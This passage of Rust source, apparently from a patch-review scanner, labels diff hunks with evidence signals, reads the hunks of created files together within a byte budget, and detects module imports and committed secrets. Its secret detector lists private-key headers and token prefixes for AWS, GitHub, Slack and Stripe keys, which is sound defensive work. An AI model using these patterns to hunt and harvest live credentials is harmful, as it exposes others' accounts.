            return None;
        }
        let open = self.line.len() - text.len();
        debug_assert!(std::ptr::eq(text.as_ptr(), self.line[open..].as_ptr()));
        let pairs = self.pairs.get_or_init(|| {
            let (mut pairs, mut opened) = (Vec::new(), Vec::new());
            for (at, byte) in self.line.bytes().enumerate() {
                match byte {
                    b'(' => opened.push(at),
                    b')' => pairs.extend(opened.pop().map(|open| (open, at))),
                    _ => {}
                }
            }
            pairs.sort_unstable();
            pairs
        });
        let at = pairs.binary_search_by_key(&open, |pair| pair.0).ok()?;
        self.line.get(pairs[at].1 + 1..)
    }
}

/// The first `)` of a line at or after a place, for places that do not move back: each byte
/// is looked at once however many places ask.
struct NextClose<'a> {
    line: &'a [u8],
    /// The last place asked from, and the answer.
    last: Option<(usize, Option<usize>)>,
}

impl<'a> NextClose<'a> {
    fn of(line: &'a str) -> Self {
        Self {
            line: line.as_bytes(),
            last: None,
        }
    }

    fn from(&mut self, place: usize) -> Option<usize> {
        if let Some((asked, found)) = self.last
            && place >= asked
            && found.is_none_or(|close| close >= place)
        {
            return found;
        }
        let found = self.line[place..]
            .iter()
            .position(|byte| *byte == b')')
            .map(|at| place + at);
        self.last = Some((place, found));
        found
    }
}

/// The distinct signals of `found`, in [`EvidenceSignal::ALL`] order.
fn distinct(found: &[(Side, EvidenceSignal, u32)]) -> Vec<EvidenceSignal> {
    EvidenceSignal::ALL
        .into_iter()
        .filter(|signal| found.iter().any(|(_, s, _)| s == signal))
        .collect()
}

/// What reading has cost, counted and not timed: how many times lines were scanned (a view of
/// a line is made by one scan of it or by several, one for each reading the view unites), how
/// many times a rule was asked of a line or of a view, and how many of the views made here
/// were alive at once at the most; and the bytes of lines the reading carried from hunk to
/// hunk read.
#[derive(Debug, Default)]
struct Work {
    scans: Cell<usize>,
    rules: Cell<usize>,
    alive: Cell<usize>,
    most: Cell<usize>,
    carried: Cell<usize>,
}

thread_local! {
    /// The bytes of lines the reading carried from hunk to hunk has read on this thread, each
    /// line counted with its end ([`carried_bytes_on_this_thread`]).
    static CARRIED_ON_THREAD: Cell<usize> = const { Cell::new(0) };
}

/// Not part of the API, and may change: the bytes of lines the reading carried from hunk to
/// hunk has read on this thread since it started, each line counted with its end, by every
/// reader. The tests that hold what one request reads, whatever readers it makes, take the
/// difference before and after it.
#[doc(hidden)]
#[must_use]
pub fn carried_bytes_on_this_thread() -> usize {
    CARRIED_ON_THREAD.with(Cell::get)
}

impl Work {
    /// The view of `line` in the reading carried from hunk to hunk, from `state`, counted.
    fn carried_view(&self, language: Language, line: &str, state: &mut Carried) -> Live<'_> {
        let bytes = line.len() + 1;
        self.carried.set(self.carried.get() + bytes);
        CARRIED_ON_THREAD.with(|read| read.set(read.get() + bytes));
        self.view(carried_view(language, line, state))
    }

    /// Counts a view of a line just made, by `scans` scans of the line, until it is dropped.
    fn view(&self, (text, scans): (String, usize)) -> Live<'_> {
        self.scans.set(self.scans.get() + scans);
        self.alive.set(self.alive.get() + 1);
        self.most.set(self.most.get().max(self.alive.get()));
        Live { text, work: self }
    }
}

/// A view of a line, alive.
struct Live<'w> {
    text: String,
    work: &'w Work,
}

impl Drop for Live<'_> {
    fn drop(&mut self) {
        self.work.alive.set(self.work.alive.get() - 1);
    }
}

/// Which readings of a line a scan asks: all of them, everywhere but in the tests that ask
/// what one reading alone finds.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Asked {
    All,
    /// The reading every release up to 0.8.3 had, alone.
    #[cfg(test)]
    Released,
    /// The lexer reading alone (for a language that has none, its one reading).
    #[cfg(test)]
    Lexer,
}

/// The signals of a file's hunks, asked one hunk at a time.
///
/// Every hunk is read alone, as every release up to 0.8.3 read it. The hunks of a section
/// that creates a file are also read as one text, in the order of the patch: such a hunk is
/// read once more from what the hunks before it left open, one state, when that is something
/// (a block comment or a string). That is the only reading that goes from one hunk to
/// another; the hunks of a file that exists are read each on its own, whatever their numbers
/// say.
///
/// The hunks read together are bounded for the whole patch ([`CarriedShares`]): the created
/// files share 256 KiB of the new side (each line counted with its end) in patch order, and
/// none of the lines read together is longer than 512 bytes. A creation is read together from
/// its first hunk up to the hunk that would take it past what the files before it left, or
/// that has a longer line; from that hunk on, each hunk is read alone, as in 0.8.3. Where that
/// is depends on the patch alone, so every hunk has the same labels however the hunks are
/// asked for, and one request reads at most 256 KiB in the carried reading, whatever it asks.
/// [`Self::new`] and [`Self::naming`] read the file as the only file of its patch; the views
/// of a patch read it with its share ([`Self::in_patch`]).
///
/// What it costs, for any patch. For each side a line is on, one view of it is made as 0.8.3
/// made it, and for Rust one more as the compiler's lexer reads it; on its new side one more
/// when it stands in a later hunk of a creation, read together, that came into something
/// open. A view is
/// made by scanning the line once for each reading it unites: at most eight times for the
/// view of 0.8.3 (as in 0.8.3), five for the lexer's, and five (Rust) or eight for the
/// carried one; for ordinary text once each. A view leaves the state the next hunk goes on
/// from, so no line is read only to pass a state on. The rules of a signal are asked in
/// their order until one finds something, as in 0.8.3. Of the views made here one is alive
/// at a time (the view of 0.8.3 keeps one string for each of its scans while it unites
/// them, as it always did). What is kept:
///
/// - For hunks asked for in file order ([`Self::new`], or [`Self::in_patch`] naming none: the
///   rank's reading of each file, with its share, and a listing by path), one state, however
///   many hunks the file has. The outline and the listing of every hunk make no reader of
///   their own: they take the labels from the rank's reading.
/// - For hunks asked for in any other order, which are named first ([`Self::naming`], or
///   [`Self::in_patch`] naming them: a listing by address), the labels of the named hunks of
///   a creation, eight bytes each. The file is gone through once, as far as the last hunk
///   named; a hunk on the way that was not named is scanned once, for the state alone.
/// - A hunk of a creation behind the place the reading has come to, that was not named, is
///   answered by going through the file again from its top, as far as that hunk and never
///   past the file's share above (no view of a patch asks for one).
pub struct HunkLabels<'a> {
    file: &'a ReviewFile,
    kind: FileKind,
    rules: Vec<&'static Rule>,
    /// The file is one the patch creates, in a language, and more than one of its hunks are
    /// read together: those hunks are also one text.
    one_text: Option<Language>,
    /// How many of the file's hunks, from the first, are read together: its share of the
    /// patch's carried reading ([`CarriedShares`]).
    together: usize,
    /// The hunks named to be asked for in any order, ascending.
    named: Vec<u32>,
    /// The named hunks the reading has come to, ascending, each with its labels as bits in
    /// [`EvidenceSignal::ALL`] order.
    labels: Vec<(u32, u16)>,
    /// Where the reading of a creation stands: the first hunk not come to, and what the
    /// hunks before it left open.
    at: Option<(usize, Carried)>,
    work: Work,
}

impl<'a> HunkLabels<'a> {
    /// A reader for hunks asked for in file order, of `file` read as the only file of its
    /// patch.
    #[must_use]
    pub fn new(file: &'a ReviewFile) -> Self {
        Self::sharing(file, Share::Own)
    }

    /// A reader for the hunks `asked`, given in the order they will be asked for, of `file`
    /// read as the only file of its patch. In file order this is [`Self::new`]; in any other
    /// order the labels of these hunks are kept as the file is gone through, so each is
    /// answered without going through it again.
    #[must_use]
    pub fn naming(file: &'a ReviewFile, asked: &[usize]) -> Self {
        Self::new(file).name(asked)
    }

    /// Not part of the API, and may change: a reader for the hunks `asked` (none: in file
    /// order), as [`Self::naming`], of `file` read with its share of its patch's carried
    /// reading: `file` is the file at `index` of the files `shares` was made from. Every view
    /// of a patch reads its files so.
    #[doc(hidden)]
    #[must_use]
    pub fn in_patch(
        file: &'a ReviewFile,
        shares: &CarriedShares,
        index: usize,
        asked: &[usize],
    ) -> Self {
        Self::sharing(file, shares.share(index)).name(asked)
    }

    fn sharing(file: &'a ReviewFile, share: Share) -> Self {
        let kind = FileKind::of(file);
        let rules = RELEASED_RULES
            .iter()
            .filter(|r| kind.admits(r.scope))
            .collect();
        Self::with(file, kind, rules, share)
    }

    /// Names the hunks `asked`, when they are not in file order.
    fn name(mut self, asked: &[usize]) -> Self {
        if self.one_text.is_some() && !asked.is_sorted_by(|a, b| a < b) {
            // A hunk past the file's share is read alone and needs nothing kept.
            self.named = asked
                .iter()
                .filter(|&&index| index < self.together)
                .filter_map(|&index| u32::try_from(index).ok())
                .collect();
            self.named.sort_unstable();
            self.named.dedup();
        }
        self
    }

    fn with(file: &'a ReviewFile, kind: FileKind, rules: Vec<&'static Rule>, share: Share) -> Self {
        let language = one_text_language(file, &kind, !rules.is_empty());
        let together = match share {
            _ if language.is_none() => 0,
            Share::Own => read_together(&file.patch_twin.hunks, CARRIED_BYTES).0,
            Share::Of(together, _) => together.min(file.patch_twin.hunks.len()),
        };
        Self {
            file,
            // A creation with fewer than two hunks in its share has nothing carried.
            one_text: language.filter(|_| together > 1),
            together,
            kind,
            rules,
            named: Vec::new(),
            labels: Vec::new(),
            at: None,
            work: Work::default(),
        }
    }

    /// The distinct signals in hunk `index` of the file, in [`EvidenceSignal::ALL`] order.
    #[must_use]
    pub fn of(&mut self, index: usize) -> Vec<EvidenceSignal> {
        if let Some(bits) = self.kept_labels(index) {
            return EvidenceSignal::ALL
                .into_iter()
                .enumerate()
                .filter(|(bit, _)| bits & (1 << bit) != 0)
                .map(|(_, signal)| signal)
                .collect();
        }
        let found: Vec<_> = self
            .matches(index)
            .into_iter()
            .map(|(side, signal, line, _)| (side, signal, line))
            .collect();
        distinct(&found)
    }

    /// Not part of the API, and may change: how many times lines were scanned so far, inside
    /// the views made of them (a view unites one scan of its line for each reading it holds).
    /// The tests that hold what a request costs count with it.
    #[doc(hidden)]
    #[must_use]
    pub fn scans(&self) -> usize {
        self.work.scans.get()
    }

    /// Not part of the API, and may change: how many times a rule was asked of a line or of
    /// a view of one so far.
    #[doc(hidden)]
    #[must_use]
    pub fn rule_evaluations(&self) -> usize {
        self.work.rules.get()
    }

    /// Not part of the API, and may change: the most views of lines made by this reader that
    /// were alive at once so far (not the views the released scanner keeps inside its own
    /// view while it unites them). The tests that hold what a scan keeps count with it.
    #[doc(hidden)]
    #[must_use]
    pub fn views_alive_at_most(&self) -> usize {
        self.work.most.get()
    }

    /// Not part of the API, and may change: how many entries are kept now, the labels of
    /// named hunks and the one state of the reading in file order while it is under way.
    #[doc(hidden)]
    #[must_use]
    pub fn entries_kept(&self) -> usize {
        self.labels.len() + usize::from(self.at.is_some())
    }

    /// Not part of the API, and may change: the bytes of lines the reading carried from hunk
    /// to hunk read so far, each line counted with its end. The tests that hold its bound count
    /// with it.
    #[doc(hidden)]
    #[must_use]
    pub fn carried_bytes(&self) -> usize {
        self.work.carried.get()
    }

    /// Not part of the API, and may change: how many of the file's hunks, from the first, are
    /// read together as one text (none for a file that is not such a creation).
    #[doc(hidden)]
    #[must_use]
    pub fn read_together(&self) -> usize {
        if self.one_text.is_some() {
            self.together
        } else {
            0
        }
    }

    /// The labels kept for hunk `index`, when it is a named hunk the reading has come to.
    fn kept_labels(&self, index: usize) -> Option<u16> {
        let index = u32::try_from(index).ok()?;
        let at = self.labels.binary_search_by_key(&index, |&(hunk, _)| hunk);
        at.ok().map(|at| self.labels[at].1)
    }

    /// Whether hunk `index` is one of the hunks named to be asked for in any order.
    fn is_named(&self, index: usize) -> bool {
        u32::try_from(index).is_ok_and(|index| self.named.binary_search(&index).is_ok())
    }

    /// The findings of hunk `index`: [`hunk_matches`], and for a later hunk of a creation that
    /// comes into something open also what the reading carried into it finds (which is never
    /// a released finding).
    fn matches(&mut self, index: usize) -> Vec<Item> {
        let file = self.file;
        let hunks = &file.patch_twin.hunks;
        if index >= hunks.len() || self.rules.is_empty() {
            return Vec::new();
        }
        let language = self.kind.language;
        // A hunk past the bound, like a hunk of any file not read as one text, is read alone.
        let Some(text_language) = self.one_text.filter(|_| index < self.together) else {
            return scan_hunk(
                &hunks[index],
                language,
                &self.rules,
                Asked::All,
                None,
                &self.work,
            );
        };
        // The reading in file order, brought as far as this hunk: from where it stands, or
        // from the top of the file again when it has gone past.
        let (mut next, mut carried) = self
            .at
            .take()
            .filter(|(next, _)| *next <= index)
            .unwrap_or_default();
        while next < index {
            if self.is_named(next) && self.kept_labels(next).is_none() {
                // A named hunk on the way: its labels are kept now.
                let found = scan_hunk(
                    &hunks[next],
                    language,
                    &self.rules,
                    Asked::All,
                    Some(&mut carried),
                    &self.work,
                );
                self.keep(next, &found);
            } else {
                // Any other: one scan of each line, for what it leaves open.
                for line in &hunks[next].lines {
                    if line.kind != PatchLineKind::Removed {
                        drop(
                            self.work
                                .carried_view(text_language, &line.text, &mut carried),
                        );
                    }
                }
            }
            next += 1;
        }
        let found = scan_hunk(
            &hunks[index],
            language,
            &self.rules,
            Asked::All,
            Some(&mut carried),
            &self.work,
        );
        self.keep(index, &found);
        // Once the last named hunk is answered, every named hunk is answered from what is
        // kept, and the reading is done with.
        let last_named = self.named.last().map(|&last| usize::try_from(last));
        self.at = match last_named {
            Some(Ok(last)) if last <= index => None,
            _ => Some((index + 1, carried)),
        };
        found
    }

    /// Keeps the labels of hunk `index`, when it is a named hunk.
    fn keep(&mut self, index: usize, found: &[Item]) {
        if !self.is_named(index) || self.kept_labels(index).is_some() {
            return;
        }
        let Ok(hunk) = u32::try_from(index) else {
            return;
        };
        let bits = EvidenceSignal::ALL
            .into_iter()
            .enumerate()
            .filter(|(_, signal)| found.iter().any(|(_, s, _, _)| s == signal))
            .fold(0u16, |bits, (bit, _)| bits | (1 << bit));
        let at = self.labels.partition_point(|&(kept, _)| kept < hunk);
        self.labels.insert(at, (hunk, bits));
    }
}

/// The language a file is read in as one text, when it is: a file the patch creates in more
/// than one hunk, in a language, that some rule reads (`has_rules`).
fn one_text_language(file: &ReviewFile, kind: &FileKind, has_rules: bool) -> Option<Language> {
    let created = file.status == FileStatus::Added && file.patch_twin.hunks.len() > 1;
    kind.language.filter(|_| created && has_rules)
}

/// How many of a creation's `hunks`, from the first, can be read together with `left` bytes
/// of the carried reading left, and the bytes of those hunks: up to the first hunk with a
/// line on its new side longer than [`CARRIED_LINE_BYTES`], or that takes the bytes of the
/// new side (each line counted with its end) past `left`. It reads at most that much of them.
fn read_together(hunks: &[PatchHunk], left: usize) -> (usize, usize) {
    let mut bytes = 0usize;
    for (index, hunk) in hunks.iter().enumerate() {
        let before = bytes;
        for line in &hunk.lines {
            if line.kind == PatchLineKind::Removed {
                continue;
            }
            bytes += line.text.len() + 1;
            if line.text.len() > CARRIED_LINE_BYTES || bytes > left {
                return (index, before);
            }
        }
    }
    (hunks.len(), bytes)
}

/// How many hunks of a file are read together, and what the reading of its path's sections
/// as one file adds to each of its hunks.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Share<'a> {
    /// As the only file of its patch: the whole of [`CARRIED_BYTES`], and no other section.
    Own,
    /// As many as its patch's [`CarriedShares`] gave it, and the hits of its hunks in the
    /// reading of its path's sections as one file (none when it is not so read).
    Of(usize, &'a [Vec<Hit>]),
}

/// Not part of the API, and may change: how many hunks of each file of a patch, from the
/// first, are read together as one text. The files a patch creates in more than one hunk,
/// in a language that some rule reads, share one carried reading of 256 KiB of new side
/// (each line counted with its end) in patch order: each, in its turn, has the hunks that
/// fit in what the files before it left, as far as the first hunk with a line longer than
/// 512 bytes, and what it has is taken from what is left. A file with fewer than two such
/// hunks is not read as one text and takes nothing. It is worked out from the patch alone, so
/// every view of a patch gives every hunk the same labels, and the carried reading of one
/// request, of a view over the whole patch or of any hunks of it in any order, reads at most
/// 256 KiB in all.
///
/// The sections of one path that the patch writes in an order Git applies one after the other
/// (a change in place after a section that wrote the path; a creation after a deletion begins
/// again: the parser refuses every other order) are also read as one file, a copy of the
/// first with the hunks of all of them in patch order, by every reading, those that join hunks
/// among them; what that finds in a hunk is united with the rest of that hunk's answer, on the
/// section that holds it. Such a run of sections spends its whole new side, each line counted
/// with its end, from the same 256 KiB in patch order, at its last section, and is read so only
/// when it fits and has no line longer than 512 bytes.
#[doc(hidden)]
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct CarriedShares {
    together: Vec<usize>,
    /// For each file, the hits of each of its hunks in the reading of its path's sections as
    /// one file; empty for a file not so read.
    joined: Vec<Vec<Vec<Hit>>>,
}

impl CarriedShares {
    /// The shares of the files of a patch, `files`, all of them in patch order.
    #[must_use]
    pub fn of(files: &[ReviewFile]) -> Self {
        // The runs of sections of one path, in the order of their first section.
        let mut runs: Vec<Vec<usize>> = Vec::new();
        let mut open: std::collections::HashMap<&str, usize> = std::collections::HashMap::new();
        for (index, file) in files.iter().enumerate() {
            match open.get(file.path.as_str()) {
                Some(&run) if file.status != FileStatus::Added => runs[run].push(index),
                _ => {
                    open.insert(&file.path, runs.len());
                    runs.push(vec![index]);
                }
            }
        }
        let mut last_of: Vec<Option<usize>> = vec![None; files.len()];
        for (run, sections) in runs.iter().enumerate() {
            if let [_, .., last] = sections.as_slice() {
                last_of[*last] = Some(run);
            }
        }
        let mut read_whole = Vec::new();
        let mut left = CARRIED_BYTES;
        let together = files
            .iter()
            .enumerate()
            .map(|(index, file)| {
                if let Some(run) = last_of[index] {
                    let hunks: Vec<PatchHunk> = runs[run]
                        .iter()
                        .flat_map(|&at| files[at].patch_twin.hunks.iter().cloned())
                        .collect();
                    let (fit, bytes) = read_together(&hunks, left);
                    if fit == hunks.len() {
                        left -= bytes;
                        read_whole.push((run, hunks));
                    }
                }
                if file.status != FileStatus::Added || file.patch_twin.hunks.len() < 2 {
                    return 0;
                }
                let kind = FileKind::of(file);
                let has_rules = RELEASED_RULES.iter().any(|r| kind.admits(r.scope));
                if one_text_language(file, &kind, has_rules).is_none() {
                    return 0;
                }
                let (together, bytes) = read_together(&file.patch_twin.hunks, left);
                if together < 2 {
                    return 0;
                }
                left -= bytes;
                together
            })
            .collect();
        let mut joined = vec![Vec::new(); files.len()];
        for (run, hunks) in read_whole {
            let sections = &runs[run];
            let mut whole = files[sections[0]].clone();
            whole.patch_twin.hunks = hunks;
            let count = whole.patch_twin.hunks.len();
            let mut hits = hunk_hits(&whole, Share::Of(count, &[])).into_iter();
            for &at in sections {
                joined[at] = hits
                    .by_ref()
                    .take(files[at].patch_twin.hunks.len())
                    .collect();
            }
        }
        Self { together, joined }
    }

    /// Not part of the API, and may change: whether the file at `index` is one of several
    /// sections of its path that are also read as one file.
    #[must_use]
    pub fn joined_across_sections(&self, index: usize) -> bool {
        self.joined
            .get(index)
            .is_some_and(|hunks| !hunks.is_empty())
    }

    /// The signals the reading of its path's sections as one file finds in hunk `hunk` of the
    /// file at `index`.
    fn joined_signals(&self, index: usize, hunk: usize) -> Vec<EvidenceSignal> {
        let hits = self.joined.get(index).and_then(|hunks| hunks.get(hunk));
        hits.map_or_else(Vec::new, |hits| signals_of(hits))
    }

    /// How many hunks, from the first, of the file at `index` are read together as one text
    /// (none for a file that is not so read).
    #[must_use]
    pub fn read_together(&self, index: usize) -> usize {
        self.together.get(index).copied().unwrap_or(0)
    }

    /// The share of the file at `index`.
    pub(crate) fn share(&self, index: usize) -> Share<'_> {
        let joined = self.joined.get(index).map_or(&[][..], Vec::as_slice);
        Share::Of(self.read_together(index), joined)
    }
}

/// `(side, signal, line)` for every signal some rule finds on a changed line of `hunk`, read
/// alone: once per signal and line however many rules or tokens match, in
/// [`EvidenceSignal::ALL`] order. Block comments and triple strings are followed through the
/// hunk on each side (state starts fresh per hunk).
///
/// A rule that reads code is asked of every reading of the line and finds what it finds in
/// any of them. Rust has two readings, the one 0.8.3 had and the compiler's lexer's, so every
/// item 0.8.3 reported is reported. No rule concludes anything from code being absent:
/// [`Match::AnyCode`] too is a finding (a line that is code in either reading).
fn hunk_matches(
    hunk: &PatchHunk,
    language: Option<Language>,
    rules: &[&Rule],
) -> Vec<(Side, EvidenceSignal, u32)> {
    hunk_matches_in(hunk, language, rules, Asked::All)
}

/// [`hunk_matches`] with the readings of each line that `views` names, which is all of them
/// everywhere but in the tests that ask what one reading alone finds.
fn hunk_matches_in(
    hunk: &PatchHunk,
    language: Option<Language>,
    rules: &[&Rule],
    views: Asked,
) -> Vec<(Side, EvidenceSignal, u32)> {
    scan_hunk(hunk, language, rules, views, None, &Work::default())
        .into_iter()
        .map(|(side, signal, line, _)| (side, signal, line))
        .collect()
}

/// The scan of one hunk. Each changed line is read in each reading that starts the hunk as
/// code: one view is made, the rules are asked of it, and it is dropped before the next is
/// made, so of these views one is alive at a time. Each finding says
/// whether the reading every release up to 0.8.3 had finds it: the first view, or a rule that
/// reads the line as it is. What only the lexer reading or the carried reading finds is a
/// further finding.
///
/// `chain`: the hunk is one of a file the patch creates, and `chain` is what the hunks before
/// it left open. When that is something, each line of the new side is also read from it, as
/// a further reading. `chain` is left as what this hunk leaves open for the next: the state
/// the scan ends in, in the reading that goes on (the carried one, or, when nothing was
/// carried in, the reading from code that the carried one would have been).
fn scan_hunk(
    hunk: &PatchHunk,
    language: Option<Language>,
    rules: &[&Rule],
    views: Asked,
    chain: Option<&mut Carried>,
    work: &Work,
) -> Vec<Item> {
    let mut carried = chain.as_deref().copied().unwrap_or_default();
    let carried_in = carried != Carried::default();
    let mut old_state = Readings::default();
    let mut new_state = Readings::default();
    let mut found = Vec::new();
    for line in &hunk.lines {
        let (side, number) = match line.kind {
            PatchLineKind::Context => {
                if let Some(language) = language {
                    // A line of both sides. While the two sides have the same open, one scan
                    // serves both.
                    if old_state == new_state {
                        scan_code(language, &line.text, &mut new_state, views, work, |_, _| ());
                        old_state = new_state;
                    } else {
                        scan_code(language, &line.text, &mut old_state, views, work, |_, _| ());
                        scan_code(language, &line.text, &mut new_state, views, work, |_, _| ());
                    }
                    if carried_in {
                        drop(work.carried_view(language, &line.text, &mut carried));
                    }
                }
                continue;
            }
            PatchLineKind::Added => (Side::New, line.new_line),
            PatchLineKind::Removed => (Side::Old, line.old_line),
        };
        let asking = Asking {
            rules,
            side,
            raw: &line.text,
            work,
        };
        // What the reading every release up to 0.8.3 had finds, and what only a further
        // reading finds, as bits by signal.
        let (mut released, mut further) = (0u16, 0u16);
        if let Some(language) = language {
            let state = if side == Side::New {
                &mut new_state
            } else {
                &mut old_state
            };
            scan_code(
                language,
                &line.text,
                state,
                views,
                work,
                |is_first, text| {
                    if is_first {
                        released = asking.first(Some(text));
                    } else {
                        further |= asking.later(text, released | further);
                    }
                },
            );
            if carried_in && side == Side::New {
                let view = work.carried_view(language, &line.text, &mut carried);
                further |= asking.later(&view.text, released | further);
            }
        } else {
            released = asking.first(None);
        }
        let Some(number) = number else { continue };
        for (at, signal) in EvidenceSignal::ALL.into_iter().enumerate() {
            let by_released = released & (1 << at) != 0;
            if by_released || further & (1 << at) != 0 {
                found.push((side, signal, number, by_released));
            }
        }
    }
    if let Some(chain) = chain {
        *chain = match language {
            _ if carried_in => carried,
            Some(language) => new_state.carried(language),
            None => Carried::default(),
        };
    }
    found
}

/// The rules asked of one changed line. The rules of a signal are asked in their order until
/// one finds something, as they always were: no rule is asked of the first view that 0.8.3
/// did not ask, and a signal that is found is not asked for again in a later view.
struct Asking<'a> {
    rules: &'a [&'a Rule],
    side: Side,
    /// The line as it is.
    raw: &'a str,
    work: &'a Work,
}

impl Asking<'_> {
    fn hits_in(&self, rule: &Rule, text: &str) -> bool {
        self.work.rules.set(self.work.rules.get() + 1);
        match rule.matches {
            Match::Tokens(tokens) => tokens.iter().any(|t| token_in(text, t)),
            Match::AnyCode => !text.trim().is_empty(),
            Match::Secret => looks_like_secret(text),
            Match::Imports(modules) => imports_module(text, self.raw, modules),
            // Releases 0.8.3 and 0.8.4 had no rule of these kinds ([`RELEASED_RULES`]).
            Match::EmptyHandler | Match::Spaced { .. } => false,
        }
    }

    fn of_signal(&self, signal: EvidenceSignal) -> impl Iterator<Item = &&Rule> {
        self.rules
            .iter()
            .filter(move |r| r.signal == signal && r.side == self.side)
    }

    /// The signals found, as bits, by the reading every release up to 0.8.3 had: `view` is
    /// its view of the line, or nothing where there is no language to read code in.
    fn first(&self, view: Option<&str>) -> u16 {
        let mut bits = 0u16;
        for (at, signal) in EvidenceSignal::ALL.into_iter().enumerate() {
            let hit = self.of_signal(signal).any(|rule| match (rule.view, view) {
                (View::Code, Some(view)) => self.hits_in(rule, view),
                // A rule that reads the line as it is; and a rule that reads code where
                // there is no language to read it in (`Scope::Any` code rules).
                (View::Raw, _) | (View::Code, None) => self.hits_in(rule, self.raw),
            });
            bits |= u16::from(hit) << at;
        }
        bits
    }

    /// The signals not in `found` that a further view of the line has, as bits.
    fn later(&self, view: &str, found: u16) -> u16 {
        let mut bits = 0u16;
        for (at, signal) in EvidenceSignal::ALL.into_iter().enumerate() {
            if found & (1 << at) == 0 {
                let hit = self
                    .of_signal(signal)
                    .any(|rule| rule.view == View::Code && self.hits_in(rule, view));
                bits |= u16::from(hit) << at;
            }
        }
        bits
    }
}

/// The readings of `line` that start as code, one at a time: each view is made, given to
/// `read` (with whether it is the first, the reading every release up to 0.8.3 had) and
/// dropped before the next is made. `state` is left as the line leaves it in each reading.
fn scan_code(
    language: Language,
    line: &str,
    state: &mut Readings,
    views: Asked,
    work: &Work,
    mut read: impl FnMut(bool, &str),
) {
    let lexer = language == Language::Rust;
    #[cfg(test)]
    let (released_asked, lexer_alone) = (views != Asked::Lexer || !lexer, views == Asked::Lexer);
    #[cfg(not(test))]
    let (released_asked, lexer_alone) = {
        let Asked::All = views;
        (true, false)
    };
    if released_asked {
        let view = work.view(state.released_view(language, line));
        read(true, &view.text);
    }
    #[cfg(test)]
    let lexer = lexer && views != Asked::Released;
    if lexer {
        let view = work.view(state.lexer_view(line));
        read(lexer_alone, &view.text);
    }
}

/// Whether a JS line loads one of `modules` (`node:` optional) with `require(…)` (also
/// `module.require`), `import(…)`, `import …` or `from …`. The keyword and the opening quote must
/// be code in `code` (the line's code view), so a comment or a string that mentions an import
/// does not count; the specifier is read from `raw` at the same offset. A type-only statement
/// (`import type`, `export type`) and `typeof import(…)` load nothing and do not count
/// (`typeof require(…)` still calls `require`); an
/// `import(…)` type annotation does (it errs toward evidence).
fn imports_module(code: &str, raw: &str, modules: &[&str]) -> bool {
    let c = code.as_bytes();
    let specifier_at = |at: usize, keyword: &str| -> Option<&str> {
        let before = &code[..at];
        let receiver_ok = at == 0
            || !is_boundary_blocker(c[at - 1])
            || (keyword == "require" && before.ends_with("module."));
        let after = at + keyword.len();
        if !receiver_ok
            || c.get(after).is_some_and(|b| is_ident(*b))
            || (keyword == "import" && before.trim_end().ends_with("typeof"))
        {
            return None;
        }
        // Whitespace and any number of `(` may sit between the keyword and the specifier.
        let gap = c[after..]
            .iter()
            .take_while(|b| b.is_ascii_whitespace() || **b == b'(')
            .count();
        let q = after + gap;
        if keyword == "require" && !c[after..q].contains(&b'(') {
            return None;
        }
        let quote = *c.get(q).filter(|b| matches!(b, b'"' | b'\'' | b'`'))?;
        let name = raw.get(q + 1..)?;
        let name = &name[..name.find(char::from(quote))?];
        Some(name.strip_prefix("node:").unwrap_or(name))
    };
    // Every keyword hit in line order, so one forward walk knows which statement each is in
    // and the type-only test runs once per statement: the line stays linear. The hits of the
    // three keywords are taken as they come, the earliest next, and no list of them is kept.
    let mut found = ["require", "import", "from"].map(|keyword| {
        code.match_indices(keyword)
            .map(move |(at, _)| (at, keyword))
            .peekable()
    });
    let mut hits = std::iter::from_fn(move || {
        let next = found
            .iter_mut()
            .filter_map(|hits| hits.peek().copied())
            .min()?;
        found.iter_mut().find_map(|hits| hits.next_if_eq(&next))
    });
    // `start` is where the current statement begins; only the bytes since the last hit are
    // searched for a later `;`.
    let (mut seen, mut start, mut type_only) = (0, 0, None);
    hits.any(|(at, keyword)| {
        if let Some(semi) = code[seen..at].rfind(';') {
            start = seen + semi + 1;
            type_only = None;
        }
        seen = at;
        let skip = *type_only.get_or_insert_with(|| {
            let head = code[start..].trim_start();
            head.starts_with("import type ") || head.starts_with("export type ")
        });
        !skip && specifier_at(at, keyword).is_some_and(|m| modules.contains(&m))
    })
}

fn token_in(text: &str, token: &str) -> bool {
    match token.strip_suffix('*') {
        // A prefix token: a boundary before it, none required after.
        Some(prefix) => text
            .match_indices(prefix)
            .any(|(i, _)| i == 0 || !is_boundary_blocker(text.as_bytes()[i - 1])),
        None => has_token(text, token),
    }
}

/// A private key header, or a cloud, forge or chat token by its fixed prefix and length.
/// The token itself is never copied into evidence: only its line number is.
#[must_use]
fn looks_like_secret(text: &str) -> bool {
    if text.contains("-----BEGIN") && text.contains("PRIVATE KEY") {
        return true;
    }
    // At most `min` bytes of each run are read, which decides `run >= min` as the whole run
    // does: a prefix that repeats inside its own run (`xAKIAAKIA…`) was walked to the run's
    // end at every repeat, the square of the line's length (2026-11-18, beside FINDING-5).
    let tail = |&(prefix, min, ok): &SecretPrefix| {
        text.match_indices(prefix).any(|(i, _)| {
            let before = i.checked_sub(1).map(|j| text.as_bytes()[j]);
            let boundary = before.is_none_or(|b| !b.is_ascii_alphanumeric());
            let run = text.as_bytes()[i + prefix.len()..]
                .iter()
                .take(min)
                .take_while(|b| ok(**b))
                .count();
            boundary && run >= min
        })
    };
    SECRET_PREFIXES.iter().any(tail)
}

/// A secret prefix, the least number of bytes after it, and which bytes those may be.
type SecretPrefix = (&'static str, usize, fn(u8) -> bool);

/// The token prefixes [`looks_like_secret`] knows, each with the least number of bytes of its
/// kind that must follow it, in the order they are tried.
const SECRET_PREFIXES: [SecretPrefix; 11] = {
    const fn upper_digit(b: u8) -> bool {
        b.is_ascii_uppercase() || b.is_ascii_digit()
    }
    const fn alnum(b: u8) -> bool {
        b.is_ascii_alphanumeric()
    }
    const fn slack(b: u8) -> bool {
        b.is_ascii_alphanumeric() || b == b'-'
    }
    [
        ("AKIA", 16, upper_digit),
        ("ghp_", 36, alnum),
        ("gho_", 36, alnum),
        ("ghs_", 36, alnum),
        ("ghu_", 36, alnum),
        ("ghr_", 36, alnum),
        ("xoxb-", 10, slack),
        ("xoxp-", 10, slack),
        ("xoxa-", 10, slack),
        ("xoxr-", 10, slack),
        ("sk_live_", 16, alnum),
    ]
};

/// The rungs an item of `signal` can stand on, as labels in the order of [`Basis`]: each rule of
